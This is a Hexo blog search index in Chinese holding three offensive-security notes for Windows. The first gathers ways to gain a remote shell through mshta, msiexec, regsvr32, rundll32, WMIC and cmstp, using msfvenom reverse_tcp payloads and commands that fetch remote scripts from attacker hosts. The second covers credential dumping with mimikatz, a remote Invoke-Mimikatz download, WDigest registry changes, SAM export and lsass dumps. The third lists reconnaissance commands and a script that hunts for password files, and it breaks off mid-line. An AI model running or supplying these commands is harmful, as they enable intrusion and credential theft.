<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>在命令执行的情况下上线的几种方式-Windows</title>
    <url>/2021/01/13/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        对Windows的系统，经常会出现可以执行命令，但无法上线或是拿shell的情况<a id="more"></a>。针对Windows的上线分为远程执行和本地运行，以下就两种利用方式把从各类技巧做一个汇总。</p>
<hr>
<h2 id="远程执行"><a href="#远程执行" class="headerlink" title="远程执行"></a>远程执行</h2><h3 id="mshta方式"><a href="#mshta方式" class="headerlink" title="mshta方式"></a>mshta方式</h3><h4 id="metaspolit模块"><a href="#metaspolit模块" class="headerlink" title="metaspolit模块"></a>metaspolit模块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;misc&#x2F;hta_server</span><br><span class="line">mshta xxx</span><br><span class="line">执行mshta xxxxx</span><br></pre></td></tr></table></figure>
<h4 id="配合CACTUSTORCH"><a href="#配合CACTUSTORCH" class="headerlink" title="配合CACTUSTORCH"></a>配合CACTUSTORCH</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下载 https:&#x2F;&#x2F;github.com&#x2F;mdsecactivebreach&#x2F;CACTUSTORCH</span><br><span class="line">生成raw格式的shellcode并base64</span><br><span class="line">	base64从文件快速编码命令：cat 1.bin |base64 -w 0</span><br><span class="line">修改CACTUSTORCH.hta文件中Dim code处的内容为base64后的shellcode</span><br><span class="line">执行mshta http:&#x2F;&#x2F;x.x.x.x&#x2F;CACTUSTORCH.hta</span><br></pre></td></tr></table></figure>
<h4 id="配合GreatSCT"><a href="#配合GreatSCT" class="headerlink" title="配合GreatSCT"></a>配合GreatSCT</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use Bypass</span><br><span class="line">use mshta&#x2F;shellcode_inject&#x2F;base64_migrate</span><br></pre></td></tr></table></figure>
<h3 id="msiexec方式"><a href="#msiexec方式" class="headerlink" title="msiexec方式"></a>msiexec方式</h3><p>可以将msi后缀改为png</p>
<h4 id="metaspolit模块-1"><a href="#metaspolit模块-1" class="headerlink" title="metaspolit模块"></a>metaspolit模块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.107 lport&#x3D;1234 –f msi &gt; shell.msi</span><br><span class="line">msiexec &#x2F;q &#x2F;i http:&#x2F;&#x2F;x.x.x.x&#x2F;shell.msi</span><br></pre></td></tr></table></figure>
<h4 id="自编译msi"><a href="#自编译msi" class="headerlink" title="自编译msi"></a>自编译msi</h4><p>修改恶意msi.wix文件中要执行的命令</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Wix</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/wix/2006/wi&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Product</span> <span class="attr">Id</span>=<span class="string">&quot;*&quot;</span> <span class="attr">UpgradeCode</span>=<span class="string">&quot;12345678-1234-1234-1234-111111111111&quot;</span> <span class="attr">Name</span>=<span class="string">&quot;Example Product </span></span></span><br><span class="line"><span class="tag"><span class="string">Name&quot;</span> <span class="attr">Version</span>=<span class="string">&quot;0.0.1&quot;</span> <span class="attr">Manufacturer</span>=<span class="string">&quot;@_xpn_&quot;</span> <span class="attr">Language</span>=<span class="string">&quot;1033&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Package</span> <span class="attr">InstallerVersion</span>=<span class="string">&quot;200&quot;</span> <span class="attr">Compressed</span>=<span class="string">&quot;yes&quot;</span> <span class="attr">Comments</span>=<span class="string">&quot;Windows Installer Package&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Media</span> <span class="attr">Id</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">&quot;TARGETDIR&quot;</span> <span class="attr">Name</span>=<span class="string">&quot;SourceDir&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">&quot;ProgramFilesFolder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">&quot;INSTALLLOCATION&quot;</span> <span class="attr">Name</span>=<span class="string">&quot;Example&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Component</span> <span class="attr">Id</span>=<span class="string">&quot;ApplicationFiles&quot;</span> <span class="attr">Guid</span>=<span class="string">&quot;12345678-1234-1234-1234-222222222222&quot;</span>&gt;</span>     </span><br><span class="line">          <span class="tag">&lt;/<span class="name">Component</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Feature</span> <span class="attr">Id</span>=<span class="string">&quot;DefaultFeature&quot;</span> <span class="attr">Level</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ComponentRef</span> <span class="attr">Id</span>=<span class="string">&quot;ApplicationFiles&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Feature</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Id</span>=<span class="string">&quot;cmdline&quot;</span>&gt;</span>calc</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">CustomAction</span> <span class="attr">Id</span>=<span class="string">&quot;SystemShell&quot;</span> <span class="attr">Execute</span>=<span class="string">&quot;deferred&quot;</span> <span class="attr">Directory</span>=<span class="string">&quot;TARGETDIR&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">ExeCommand</span>=<span class="string">&#x27;[cmdline]&#x27;</span> <span class="attr">Return</span>=<span class="string">&quot;ignore&quot;</span> <span class="attr">Impersonate</span>=<span class="string">&quot;no&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">CustomAction</span> <span class="attr">Id</span>=<span class="string">&quot;FailInstall&quot;</span> <span class="attr">Execute</span>=<span class="string">&quot;deferred&quot;</span> <span class="attr">Script</span>=<span class="string">&quot;vbscript&quot;</span> <span class="attr">Return</span>=<span class="string">&quot;check&quot;</span>&gt;</span></span><br><span class="line">      invalid vbs to fail install</span><br><span class="line">    <span class="tag">&lt;/<span class="name">CustomAction</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">InstallExecuteSequence</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Custom</span> <span class="attr">Action</span>=<span class="string">&quot;SystemShell&quot;</span> <span class="attr">After</span>=<span class="string">&quot;InstallInitialize&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Custom</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Custom</span> <span class="attr">Action</span>=<span class="string">&quot;FailInstall&quot;</span> <span class="attr">Before</span>=<span class="string">&quot;InstallFiles&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Custom</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">InstallExecuteSequence</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Product</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Wix</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用wix工具编译生成msi.wix</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">candle.exe msi.wix</span><br><span class="line">light.exe xxx.wixobj</span><br></pre></td></tr></table></figure>
<h4 id="exe转msi"><a href="#exe转msi" class="headerlink" title="exe转msi"></a>exe转msi</h4><p>使用exe2msi.msi工具将exe转为msi</p>
<p>如果exe是免杀的，那么这样一来就可以无需exe落地就能远程执行</p>
<h3 id="regsvr32方式"><a href="#regsvr32方式" class="headerlink" title="regsvr32方式"></a>regsvr32方式</h3><h4 id="配合metaspolit模块"><a href="#配合metaspolit模块" class="headerlink" title="配合metaspolit模块"></a>配合metaspolit模块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery</span><br><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;x.x.x.x&#x2F;file.sct scrobj.dll</span><br></pre></td></tr></table></figure>
<h4 id="配合empire"><a href="#配合empire" class="headerlink" title="配合empire"></a>配合empire</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uselistner http			#开启监听</span><br><span class="line">set Host http:&#x2F;&#x2F;192.168.1.109 #设置监听地址</span><br><span class="line">execute		#运行监听</span><br><span class="line">usestager windows&#x2F;launcher_sct  #选择模块</span><br><span class="line">set listener http	#选择监听</span><br><span class="line">execute		#运行模块</span><br><span class="line">regsvr &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.1.109:8080&#x2F;tmp&#x2F;launcher.sct scrobj.dll</span><br></pre></td></tr></table></figure>
<h4 id="自定义SCT文件"><a href="#自定义SCT文件" class="headerlink" title="自定义SCT文件"></a>自定义SCT文件</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?XML version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">registration</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">progid</span>=<span class="string">&quot;PoC&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">classid</span>=<span class="string">&quot;&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span> &gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- Proof Of Concept - Casey Smith @subTee --&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--  License: BSD3-Clause --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;JScript&quot;</span>&gt;</span></span><br><span class="line">		&lt;![CDATA[</span><br><span class="line">	</span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> r = <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;WScript.Shell&quot;</span>).Run(<span class="string">&quot;calc.exe&quot;</span>);	</span></span><br><span class="line">	</span><br><span class="line">		]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">registration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>执行：regsvr32 /u /n /s /i:<a href="http://192.168.1.109/1.sct">http://192.168.1.109/1.sct</a> scrobj.dll</p>
<h4 id="配合koadic"><a href="#配合koadic" class="headerlink" title="配合koadic"></a>配合koadic</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use stager&#x2F;js&#x2F;regsvr</span><br><span class="line">set srvhost 192.168.1.107</span><br><span class="line">run</span><br><span class="line">regsvr32 &#x2F;u &#x2F;n &#x2F;s &#x2F;i:http;&#x2F;&#x2F;192.168.1.107:9998&#x2F;uWBjv scrobj.dll</span><br><span class="line">zombies 0</span><br></pre></td></tr></table></figure>
<h4 id="配合JSRat"><a href="#配合JSRat" class="headerlink" title="配合JSRat"></a>配合JSRat</h4><p>下载<a href="https://github.com/Hood3dRob1n/JSRat-Py">https://github.com/Hood3dRob1n/JSRat-Py</a></p>
<p>在本机执行./JSRat.py -I 0.0.0.0 -p 9999后，脚本会自动生成命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JSRat Server - Python Implementation</span><br><span class="line">By: Hood3dRob1n</span><br><span class="line"></span><br><span class="line">[*] Web Server Started on Port: 9999</span><br><span class="line">[*] Awaiting Client Connection to:</span><br><span class="line">   [*] rundll32 invocation: http:&#x2F;&#x2F;0.0.0.0:9999&#x2F;connect</span><br><span class="line">   [*] regsvr32 invocation: http:&#x2F;&#x2F;0.0.0.0:9999&#x2F;file.sct</span><br><span class="line">      [*] Client Command at: http:&#x2F;&#x2F;0.0.0.0:9999&#x2F;wtf</span><br><span class="line">      [*] Browser Hook Set at: http:&#x2F;&#x2F;0.0.0.0:9999&#x2F;hook</span><br><span class="line"></span><br><span class="line">[-] Hit CTRL+C to Stop the Server at any time...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="配合GreatSCT-1"><a href="#配合GreatSCT-1" class="headerlink" title="配合GreatSCT"></a>配合GreatSCT</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use Bypass</span><br><span class="line">use regsvr&#x2F;shellcode_iject&#x2F;base64_migrate.py</span><br><span class="line">generate</span><br></pre></td></tr></table></figure>
<h3 id="rundll32方式"><a href="#rundll32方式" class="headerlink" title="rundll32方式"></a>rundll32方式</h3><h4 id="metaspolit模块-2"><a href="#metaspolit模块-2" class="headerlink" title="metaspolit模块"></a>metaspolit模块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.107 lport&#x3D;1234 -f dll &gt; 1.dll</span><br><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;smb_delivery</span><br><span class="line">rundll32.exe \\192.168.1.107\ZtmW\test.dll,0</span><br></pre></td></tr></table></figure>
<h4 id="配合Koadic"><a href="#配合Koadic" class="headerlink" title="配合Koadic"></a>配合Koadic</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use stager&#x2F;js&#x2F;rundll32_js</span><br><span class="line">set SRVHOST 192.168.1.107</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<h3 id="SCT文件直接利用"><a href="#SCT文件直接利用" class="headerlink" title="SCT文件直接利用"></a>SCT文件直接利用</h3><h4 id="pubprn-vbs结合SCT文件利用"><a href="#pubprn-vbs结合SCT文件利用" class="headerlink" title="pubprn.vbs结合SCT文件利用"></a>pubprn.vbs结合SCT文件利用</h4><p>windows7下未成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript &#x2F;b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:http:&#x2F;&#x2F;10.100.18.20:8000&#x2F;1.sct</span><br></pre></td></tr></table></figure>
<h4 id="配合empire-1"><a href="#配合empire-1" class="headerlink" title="配合empire"></a>配合empire</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">listeners</span><br><span class="line">uselistener http</span><br><span class="line">set Host 192.168.1.109</span><br><span class="line">execute</span><br><span class="line">usestager windows&#x2F;launcher_sct</span><br><span class="line">set Listener HTTP</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
<h3 id="WMIC利用xsl方式"><a href="#WMIC利用xsl方式" class="headerlink" title="WMIC利用xsl方式"></a>WMIC利用xsl方式</h3><h4 id="配合koadic-1"><a href="#配合koadic-1" class="headerlink" title="配合koadic"></a>配合koadic</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zerosum0x0&#x2F;koadic</span><br><span class="line">use stager&#x2F;js&#x2F;wmic</span><br><span class="line">set SRVHOST 192.168.1.107</span><br><span class="line">run</span><br><span class="line">wmic os get &#x2F;FORMAT:&quot;http:&#x2F;&#x2F;192.168.1.109&#x2F;payload.xsl&quot;</span><br></pre></td></tr></table></figure>
<h4 id="自定义xsl"><a href="#自定义xsl" class="headerlink" title="自定义xsl"></a>自定义xsl</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot; xmlns:ms&#x3D;&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user&#x3D;&quot;placeholder&quot;</span><br><span class="line">version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line">&lt;output method&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">	&lt;ms:script implements-prefix&#x3D;&quot;user&quot; language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">	&lt;![CDATA[</span><br><span class="line">	var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;);</span><br><span class="line">	]]&gt; &lt;&#x2F;ms:script&gt;</span><br><span class="line">&lt;&#x2F;stylesheet&gt;</span><br></pre></td></tr></table></figure>
<h2 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h2><p>一般而言，本地执行的BypassAV的能力都比远程强，缺点就是文件落地难。</p>
<h3 id="MSbuild-exe利用"><a href="#MSbuild-exe利用" class="headerlink" title="MSbuild.exe利用"></a>MSbuild.exe利用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;45.76.107.177 lport&#x3D;6677 -f csharp</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe  exp.csproj  （改为XML格式也可）</span><br></pre></td></tr></table></figure>
<h3 id="INF文件利用"><a href="#INF文件利用" class="headerlink" title="INF文件利用"></a>INF文件利用</h3><h4 id="配合cmstp-exe"><a href="#配合cmstp-exe" class="headerlink" title="配合cmstp.exe"></a>配合cmstp.exe</h4><p>依靠加载远程sct文件利用</p>
<p>新建一个inf，在代码处填入恶意sct文件。</p>
<p>然后运行cmstp.exe /s shell.inf</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[version]</span></span><br><span class="line"><span class="attr">Signature</span>=<span class="variable">$chicago</span>$</span><br><span class="line"><span class="attr">AdvancedINF</span>=<span class="number">2.5</span></span><br><span class="line"></span><br><span class="line"><span class="section">[DefaultInstall_SingleUser]</span></span><br><span class="line"><span class="attr">UnRegisterOCXs</span>=UnRegisterOCXSection</span><br><span class="line"></span><br><span class="line"><span class="section">[UnRegisterOCXSection]</span></span><br><span class="line">%11%\scrobj.dll,NI,https://gist.githubusercontent.com/NickTyrer/0604bb9d7bcfef9e0cf82c28a7b76f0f/raw/676451571c203303a95b95fcb29c8b7deb8a66e0/powersct.sct</span><br><span class="line"></span><br><span class="line"><span class="section">[Strings]</span></span><br><span class="line"><span class="attr">AppAct</span> = <span class="string">&quot;SOFTWARE\Microsoft\Connection Manager&quot;</span></span><br><span class="line"><span class="attr">ServiceName</span>=<span class="string">&quot;Yay&quot;</span></span><br><span class="line"><span class="attr">ShortSvcName</span>=<span class="string">&quot;Yay&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="配合InfDefaultInstall-exe"><a href="#配合InfDefaultInstall-exe" class="headerlink" title="配合InfDefaultInstall.exe"></a>配合InfDefaultInstall.exe</h4><p>运行InfDefaultInstall.exe shady.inf</p>
<h2 id="以上"><a href="#以上" class="headerlink" title="以上"></a>以上</h2>]]></content>
      <categories>
        <category>技巧</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>在Windows中抓密码</title>
    <url>/2021/01/14/Windows%E6%8A%93%E5%AF%86%E7%A0%81%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<p><em>记录一下几种抓密码的不同方式</em><a id="more"></a></p>
<h2 id="进入正题"><a href="#进入正题" class="headerlink" title="进入正题"></a>进入正题</h2><h3 id="远程直接抓"><a href="#远程直接抓" class="headerlink" title="远程直接抓"></a>远程直接抓</h3><h4 id="MeterPreter"><a href="#MeterPreter" class="headerlink" title="MeterPreter"></a>MeterPreter</h4><p>直接敲命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz </span><br><span class="line">meterpreter &gt; msv  获取的是hash值</span><br><span class="line">meterpreter &gt; ssp  获取的是明文信息</span><br><span class="line">meterpreter &gt; wdigest  读取内存中存放的账号密码明文信息</span><br></pre></td></tr></table></figure>
<h4 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h4><p>直接右键</p>
<h4 id="PowerSpolit"><a href="#PowerSpolit" class="headerlink" title="PowerSpolit"></a>PowerSpolit</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;x.x.x.x&#x2F;Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>
<h4 id="MimiKatz"><a href="#MimiKatz" class="headerlink" title="MimiKatz"></a>MimiKatz</h4><p>前提是上传了</p>
<p>2012R2需要修改注册表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">加载明文：</span><br><span class="line">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br><span class="line"></span><br><span class="line">不加载明文：</span><br><span class="line">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure>
<h3 id="本地抓"><a href="#本地抓" class="headerlink" title="本地抓"></a>本地抓</h3><h4 id="导出SAM文件"><a href="#导出SAM文件" class="headerlink" title="导出SAM文件"></a>导出SAM文件</h4><p>导出SAM和System⽂件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure>
<p>读取⽂件<br>mimikatz读取SAM和SYSTEM⽂件[将导⼊的hive⽂件放到本地]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::sam &#x2F;sam:sam.hive &#x2F;system:system.hive</span><br></pre></td></tr></table></figure>
<h4 id="通过Procdump"><a href="#通过Procdump" class="headerlink" title="通过Procdump"></a>通过Procdump</h4><p>通过Procdump dump lsass.exe 进程数据并将其保存到 lsass.dmp 文件中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
<p>将lsass.tmp拉取到本地使用mimikatz解密目标系统密码。（本地机器需与目标机器的版本位数一致。）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;log res.log&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure>
<h2 id="以上"><a href="#以上" class="headerlink" title="以上"></a>以上</h2>]]></content>
      <categories>
        <category>HashDump</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>在Windows中找敏感信息</title>
    <url>/2021/01/14/%E5%9C%A8Windows%E4%B8%AD%E6%89%BE%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/</url>
    <content><![CDATA[<p><em>信息搜集很重要</em><a id="more"></a></p>
<h2 id="常用CMD命令"><a href="#常用CMD命令" class="headerlink" title="常用CMD命令"></a>常用CMD命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami # 查看当前用户</span><br><span class="line">net user # 查看所有用户</span><br><span class="line">query user # 查看当前在线用户</span><br><span class="line">ipconfig &#x2F;all # 查看当前主机的主机名&#x2F;IP&#x2F;DNS等信息</span><br><span class="line">route print # 查看路由表信息</span><br><span class="line">netstat -ano # 查看端口开放情况</span><br><span class="line">arp -a # 查看arp解析情况</span><br><span class="line">tasklist &#x2F;svc # 查看进程及对应服务名</span><br><span class="line">net localgroup administrators # 查看管理员组成员</span><br><span class="line">systeminfo # 查看系统信息含补丁信息</span><br><span class="line">net use # 查看ipc连接情况</span><br><span class="line">net view # 查看匿名共享情况</span><br><span class="line">netsh firewall show state # 查看防火墙状态</span><br><span class="line">cmdkey &#x2F;l # 查看当前保存的登陆凭证</span><br></pre></td></tr></table></figure>
<h2 id="Windows的本地命令执行"><a href="#Windows的本地命令执行" class="headerlink" title="Windows的本地命令执行"></a>Windows的本地命令执行</h2><p>可用来替代cmd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">forfiles &#x2F;c c:\windows\system32\calc.exe	#无限运行</span><br><span class="line">pcalua.exe -a c:\windows\system32\calc.exe	</span><br><span class="line">powershell SyncAppvPublishingServer.vbs &quot;n; Start-Process c:\windows\system32\calc.exe&quot;</span><br><span class="line">cmd.exe &#x2F;c &quot;ping 127.0.0.1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe&quot;</span><br><span class="line">conhost C:\Windows\System32\calc.exe</span><br><span class="line">explorer.exe C:\Users\keefe\desktop\1.exe</span><br></pre></td></tr></table></figure>
<h2 id="域常用信息搜集"><a href="#域常用信息搜集" class="headerlink" title="域常用信息搜集"></a>域常用信息搜集</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- net config workstation #查看当前登录域</span><br><span class="line">- net user &#x2F;domain # 获得所有域用户列表</span><br><span class="line">- net view &#x2F;domain # 查看所有的域</span><br><span class="line">- net view &#x2F;domain:XXX # 查看该域内所有主机</span><br><span class="line">- net group &#x2F;domain # 查看所有域用户组列表</span><br><span class="line">- net group &quot;domain computers&quot; &#x2F;domain # 查看域内所有的主机名</span><br><span class="line">- net group &quot;domain admins&quot; &#x2F;domain # 查看所有域管理员</span><br><span class="line">- net group &quot;domain controllers&quot; &#x2F;domain # 查看所有域控制器</span><br><span class="line">- net group &quot;enterprise admins&quot; &#x2F;domain # 查看所有企业管理员</span><br><span class="line">- nltest &#x2F;domain_trusts # 获取域信任信息</span><br><span class="line">- net time &#x2F;domain # 查看当前登录域</span><br><span class="line">- net accounts &#x2F;domain # 查看域密码策略</span><br><span class="line">- dsquery server # 寻找目录中的域控制器</span><br><span class="line">- netdom query pdc # 查看域控制器主机名</span><br><span class="line">- wmic useraccount get &#x2F;all #获取域内用户的详细信息</span><br></pre></td></tr></table></figure>
<h2 id="环境信息搜集"><a href="#环境信息搜集" class="headerlink" title="环境信息搜集"></a>环境信息搜集</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- nbtscan.exe xx.xx.xx.xx&#x2F;24 # 查看c段机器</span><br><span class="line">- csvde.exe -f 1.csv -k # 批量导入&#x2F;导出AD用户</span><br><span class="line">- setspn.exe -T xx.xx.xx.xx -Q *&#x2F;* # 查看当前域内所有spn</span><br><span class="line">- netstat -ano  </span><br></pre></td></tr></table></figure>
<h2 id="密码搜集"><a href="#密码搜集" class="headerlink" title="密码搜集"></a>密码搜集</h2><p>密码文件</p>
<p>写了一个自动搜索像密码文件的脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">set &#x2F;p pwd&#x3D;&quot;输入盘符,示例 C:&#x2F; &gt;&quot;</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.properties) do @findstr &quot;password&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.ini) do @findstr &quot;password&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.xml) do @findstr &quot;password&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.config) do @findstr &quot;password&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.conf) do @findstr &quot;password&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.properties) do @findstr &quot;pass&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.ini) do @findstr &quot;pass&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; 